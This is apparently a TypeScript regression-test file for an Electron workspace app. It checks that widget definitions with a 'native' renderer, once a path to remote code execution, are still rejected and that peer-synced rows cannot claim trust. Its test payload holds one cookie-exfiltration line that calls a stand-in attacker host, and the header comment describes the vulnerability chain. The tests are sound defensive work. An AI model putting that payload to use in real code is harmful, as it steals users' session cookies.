/**
 * SECURITY REGRESSION GUARD — the native-renderer RCE path stays closed.
 *
 * ── THE DEFECT THAT WAS REMOVED ─────────────────────────────────────────────
 * A widget definition with `rendererType: "native"` carried `source`, which the
 * server compiled to `bundleSource`, which `.list` shipped UNPROJECTED to every
 * workspace member, which the browser's `NativeWidgetLoader` wrapped in a Blob,
 * minted an object URL for, and appended as a `<script>` to `document.head` —
 * same-origin JS in the TOP-LEVEL document of an IPC-privileged Electron
 * renderer. The registration gate checked `rendererType === "native" &&
 * bundleSource` and never `trustLevel`. Net effect: a workspace admin (and, over
 * pod sync, a PEER POD) could execute arbitrary code in every member's renderer.
 *
 * Three closures shut it, on three different doors:
 *   1. `routers/widget-definitions.ts`             — tRPC upsert rejects "native"
 *   2. `routers/hub-protocol/widget-definitions.ts`— agent/IS door rejects it too
 *   3. `routers/sync.ts`                           — peer rows are SKIPPED, and
 *      peer-supplied `trustLevel` is FLOORED to "generated" (a peer asserting
 *      `"trusted"` would otherwise let its framed view's writes skip the propose
 *      gate via `resolveViewTrust`).
 *
 * NONE of the three had regression coverage. Each is one careless zod edit —
 * or one restored `??` — from reverting, and every one of them fails OPEN:
 * the code executes, nothing throws, no test goes red. This file is that red.
 *
 * ── WHY TWO STYLES OF ASSERTION ──────────────────────────────────────────────
 * Doors 1 and 2 are tRPC procedures, so their input schema is reachable and the
 * assertions are BEHAVIOURAL: really parse a native payload, really assert it
 * throws. Door 3 lives in a non-exported `SUPPLEMENTARY_TABLES` handler that
 * needs a live `db`, so it is asserted from SOURCE — the same idiom this repo's
 * `__tripwires__` use. The source assertions are written to fail on the exact
 * shapes a reverting edit would produce (a `??` back on `trustLevel`, a coerce
 * instead of a `continue`), not on prose.
 */

import { describe, expect, it } from "vitest";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import type { AnyProcedure } from "@trpc/server";
import { widgetDefinitionsRouter } from "./widget-definitions.js";
import { hubWidgetDefinitionsRouter } from "./hub-protocol/widget-definitions.js";

/**
 * The zod schema a tRPC procedure validates its input with.
 *
 * Read off `_def.inputs` rather than exported from the router module, so this
 * guard needs no production-code change to exist — and so it is testing the
 * schema the procedure ACTUALLY runs, not a copy exported beside it that could
 * drift from the one wired up.
 */
function inputSchemaOf(procedure: unknown): {
  safeParse: (value: unknown) => { success: boolean; error?: unknown };
} {
  const inputs = (procedure as AnyProcedure)._def.inputs as unknown[];
  if (!inputs?.length) {
    throw new Error(
      "procedure declares no input schema — this guard cannot see the enum it protects"
    );
  }
  // Both doors declare exactly one `.input()`; take the last so a future
  // merged/chained input still yields the effective schema.
  return inputs[inputs.length - 1] as ReturnType<typeof inputSchemaOf>;
}

/** A payload that is valid in every respect EXCEPT the renderer type. */
function payload(rendererType: string): Record<string, unknown> {
  return {
    // Real v4-shaped UUIDs: the hub door validates `workspaceId` as a uuid, so a
    // placeholder with a zero version nibble would fail for the WRONG reason.
    userId: "1b3c9f4e-4a2d-4c6b-9f1e-2d7a5c8b0e11",
    workspaceId: "9d2e1a77-6c34-4f8a-b5d0-3e9c7a1b4f22",
    typeKey: "exfiltrate-session",
    name: "Totally Benign Widget",
    rendererType,
    source: "fetch('https://attacker.example/'+document.cookie)",
  };
}

const DOORS: ReadonlyArray<[string, unknown]> = [
  [
    "tRPC widgetDefinitions.upsert",
    widgetDefinitionsRouter._def.procedures.upsert,
  ],
  [
    "hub-protocol widgetDefinitions.upsertWidgetDef",
    hubWidgetDefinitionsRouter._def.procedures.upsertWidgetDef,
  ],
];

describe.each(DOORS)("%s rejects rendererType 'native'", (_name, procedure) => {
  it("the guard can see a real input schema (anti-vacuity)", () => {
    // If `_def.inputs` ever stops yielding the schema, every assertion below
    // would throw rather than pass — but say so in one named test so the cause
    // is legible instead of appearing as a mystery failure in all of them.
    expect(() => inputSchemaOf(procedure)).not.toThrow();
  });

  it("accepts a SANDBOXED renderer — the guard is not rejecting everything", () => {
    // Anti-vacuity: a schema that rejected all input would make the native
    // assertion below trivially true and cover nothing.
    expect(inputSchemaOf(procedure).safeParse(payload("iframe")).success).toBe(
      true
    );
  });

  it("REJECTS native — the arbitrary-code-execution path", () => {
    const result = inputSchemaOf(procedure).safeParse(payload("native"));
    expect(
      result.success,
      "rendererType 'native' parsed successfully. That re-opens arbitrary code " +
        "execution in every workspace member's Electron renderer: source → " +
        "bundleSource → NativeWidgetLoader → <script> in the host origin. Do " +
        "not re-enable without a REAL boundary (Worker / separate process / " +
        "Wasm VM) — see NATIVE_RENDERER_REJECTED."
    ).toBe(false);
  });

  it("explains WHY, rather than emitting a bare enum error", () => {
    // The message is the reason `"native"` is still IN the enum and rejected by
    // a refinement instead of simply removed: an agent (or an author) that gets
    // `invalid enum value` learns nothing and retries.
    const result = inputSchemaOf(procedure).safeParse(payload("native"));
    expect(JSON.stringify(result.error)).toContain("no longer accepted");
  });
});

describe("sync.ts — a PEER POD cannot ship execution or trust", () => {
  const SYNC_SRC = readFileSync(join(import.meta.dirname, "sync.ts"), "utf8");

  /** The body of the `widget_definitions` supplementary-sync handler. */
  const handler = (() => {
    const start = SYNC_SRC.indexOf("widget_definitions: async (rows)");
    expect(start, "widget_definitions sync handler not found").toBeGreaterThan(
      -1
    );
    // Up to the next top-level handler key, or the end of the table.
    const end = SYNC_SRC.indexOf("\n  },\n", start);
    return SYNC_SRC.slice(start, end === -1 ? SYNC_SRC.length : end);
  })();

  it("is non-vacuous: the handler body was really extracted", () => {
    expect(handler.length).toBeGreaterThan(500);
    expect(handler).toContain("widgetDefinitions");
  });

  it("SKIPS a native row rather than coercing it", () => {
    // `continue` is the load-bearing word. Coercing to another rendererType
    // would keep the peer's `bundleSource` in the table under a different
    // label, where one future bug re-arms it.
    const at = handler.indexOf('rendererType === "native"');
    expect(
      at,
      "sync.ts no longer compares rendererType against native"
    ).toBeGreaterThan(-1);
    const branch = handler.slice(at, at + 900);

    // A LIVE `continue;` statement — a line that is nothing else. Matching the
    // bare substring passed over `// continue;`, which is exactly the shape a
    // revert leaves behind (this was caught by mutation-testing this file).
    const exit = branch.search(/^[^\S\n]*continue;[^\S\n]*$/m);
    expect(
      exit,
      "the native branch must SKIP with a live `continue;` — a commented-out " +
        "one means the row falls through and IS stored"
    ).toBeGreaterThan(-1);

    // …and must not relabel the row on its way out. Asserted as "the branch
    // body assigns nothing on `row`" — a coercion is `row.rendererType =
    // "iframe"`. Matching a bare `rendererType =` instead would fire on the
    // warn message, which legitimately spells `rendererType='native'` INSIDE a
    // string literal (this false positive was caught by mutation-testing).
    expect(
      /\brow\.\w+\s*=[^=]/.test(branch.slice(0, exit)),
      "the native branch MUTATES the peer row — that is coercion, not " +
        "rejection: the peer's bundleSource would be stored under a benign label"
    ).toBe(false);
  });

  it("never stores a peer-supplied bundleSource", () => {
    expect(handler).toContain("bundleSource: null");
  });

  it("FLOORS peer-supplied trustLevel to 'generated' — no `??` default", () => {
    // `trustLevel: "generated"` is a FLOOR, not a default. Restoring
    // `row.trustLevel ?? "generated"` would let a hostile pod sync a legitimate
    // `frame` definition asserting `"trusted"`, which `resolveViewTrust` reads
    // as proof of a human-approved install — letting that view's mutations skip
    // the propose gate in `checkPermissionOrPropose`.
    expect(handler).toContain('trustLevel: "generated"');
    expect(
      /trustLevel:\s*[^,\n]*row\.trustLevel/.test(handler),
      "sync.ts reads the PEER's trustLevel. It must be discarded, not defaulted."
    ).toBe(false);
  });
});
